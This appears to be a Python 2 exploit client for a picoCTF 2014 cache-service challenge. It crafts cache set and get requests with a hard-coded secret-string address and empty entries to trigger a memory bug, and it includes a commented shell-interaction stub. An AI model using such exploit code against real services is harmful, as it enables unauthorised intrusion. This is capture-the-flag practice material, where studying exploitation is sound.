#!/usr/bin/python
import struct, socket, telnetlib, time, hexconvert, sys, random

def pack4(v):
    """
    Takes a 32 bit integer and returns a 4 byte string representing the
    number in little endian.
    """
    assert 0 <= v <= 0xffffffff # The < is for little endian, the I is for a 4 byte unsigned int.  # See https://docs.python.org/2/library/struct.html for more info.
    return struct.pack('<I', v)

def unpack4(v):
    """Does the opposite of pack4."""
    assert len(v) == 4
    return struct.unpack('<I', v)[0]

CACHE_GET = 0
CACHE_SET = 1

kNotFound = 0x0
kFound = 0x1
kCacheFull = 0x2

kSecretString = 0x8048c18

GREEN='\x1B[32m'
RESET='\x1B[0m'

def log(s):
    print GREEN+'[CLIENT] '+s+RESET

def short(s):
    if len(s) > 20:
	return s[:20] + '...'
    else:
        return s

def write_string(f, s):
    f.sendall(pack4(len(s)))
    f.sendall(s)

def read_string(f):
    size = unpack4(f.recv(4))
    if size == 0: return ''
    return f.recv(size)

def cache_get(f, key):
    log('cache_get(' + short(key) + ')')
    f.sendall(chr(CACHE_GET))
    write_string(f, key)
    
    status = ord(f.recv(1))
    if status == kNotFound:
        log("not found")
        return None
    assert status == kFound

    s = read_string(f)
    log(str(len(s)) + ' bytes: '+s)
    return s

def cache_set(f, key, value, lifetime=0xffffffff):
    log('cache_set(' + short(key) + ' -> ' + short(value) + ')\tlifetime = ' + str(lifetime))
    f.sendall(chr(CACHE_SET))
    write_string(f, key)

    status = ord(f.recv(1))
    if status == kCacheFull:
        log("cache full")
        return False
    assert status == kFound
    
    write_string(f, value)
    f.sendall(pack4(lifetime))
    log("set succeeded")
    return True

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1337))
#s.connect(('vuln2014.picoctf.com',4548))

for i in range(0,32):
        cache_set(s, chr(i)+'A'*32,'A'*32)
for i in range(0,32):
        cache_get(s, chr(i)+'A'*32)

cache_set(s, '', '')
cache_get(s, '')

# Once you get the service to run a shell, this lets you send commands
# to the shell and get the results back :-)
'''
t = telnetlib.Telnet()
t.sock = s
t.interact()
'''
